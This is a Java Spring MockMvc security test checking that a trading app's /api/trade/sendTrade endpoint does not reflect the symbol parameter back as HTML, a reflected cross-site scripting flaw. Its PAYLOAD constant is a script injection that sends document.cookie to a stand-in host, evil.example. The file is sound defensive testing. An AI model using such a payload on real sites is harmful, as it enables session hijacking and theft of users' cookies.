package com.Himanshu.TradesPostProcessingSystem.swarm;

import com.Himanshu.TradesPostProcessingSystem.controller.TradeController;
import com.Himanshu.TradesPostProcessingSystem.model.Trade;
import com.Himanshu.TradesPostProcessingSystem.service.TradeService;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Tag;
import org.junit.jupiter.api.Test;
import org.springframework.http.MediaType;
import org.springframework.kafka.core.KafkaTemplate;
import org.springframework.test.util.ReflectionTestUtils;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.test.web.servlet.MvcResult;
import org.springframework.test.web.servlet.request.MockHttpServletRequestBuilder;
import org.springframework.test.web.servlet.setup.MockMvcBuilders;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;
import static org.mockito.Mockito.mock;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.post;

/** INJECT-1: the symbol query parameter is echoed back by /api/trade/sendTrade; a browser must never get it as HTML. */
@Tag("swarm")
class Inject1SwarmTest {

    private static final String BROWSER_ACCEPT =
            "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
    private static final String PAYLOAD = "<script>fetch('//evil.example/?c='+document.cookie)</script>";

    private MockMvc mvc;

    @BeforeEach
    @SuppressWarnings("unchecked")
    void setUp() {
        TradeService service = new TradeService();
        ReflectionTestUtils.setField(service, "kafkaTemplate", mock(KafkaTemplate.class));
        TradeController controller = new TradeController();
        ReflectionTestUtils.setField(controller, "tradeService", service);
        mvc = MockMvcBuilders.standaloneSetup(controller).build();
    }

    @Test
    void reflectedSymbolIsNeverServedAsHtml() throws Exception {
        MvcResult result = sendTrade(PAYLOAD, "1", "1");

        String contentType = String.valueOf(result.getResponse().getContentType());
        boolean servedAsHtml = MediaType.TEXT_HTML.isCompatibleWith(MediaType.parseMediaType(contentType));
        boolean payloadReflected = result.getResponse().getContentAsString().contains(PAYLOAD);
        assertFalse(servedAsHtml && payloadReflected,
                "attacker <script> reflected in a " + contentType + " response: " + result.getResponse().getContentAsString());
    }

    @Test
    void legitimateTradeStillConfirmed() throws Exception {
        MvcResult result = sendTrade("AAPL", "10", "190.5");
        assertEquals(200, result.getResponse().getStatus());
        assertTrue(result.getResponse().getContentAsString().contains("AAPL"));
    }

    /** Whichever verb the endpoint accepts (GET today, POST once AUTHZ-2 lands), the reflection must not be HTML. */
    private MvcResult sendTrade(String symbol, String quantity, String price) throws Exception {
        MvcResult result = mvc.perform(withTrade(get("/api/trade/sendTrade"), symbol, quantity, price)).andReturn();
        if (result.getResponse().getStatus() == 405) {
            result = mvc.perform(withTrade(post("/api/trade/sendTrade"), symbol, quantity, price)).andReturn();
        }
        return result;
    }

    private static MockHttpServletRequestBuilder withTrade(MockHttpServletRequestBuilder request, String symbol,
                                                           String quantity, String price) {
        return request.header("Accept", BROWSER_ACCEPT).header("X-Account-Id", "ACCT-A")
                .param("symbol", symbol).param("quantity", quantity).param("price", price);
    }
}
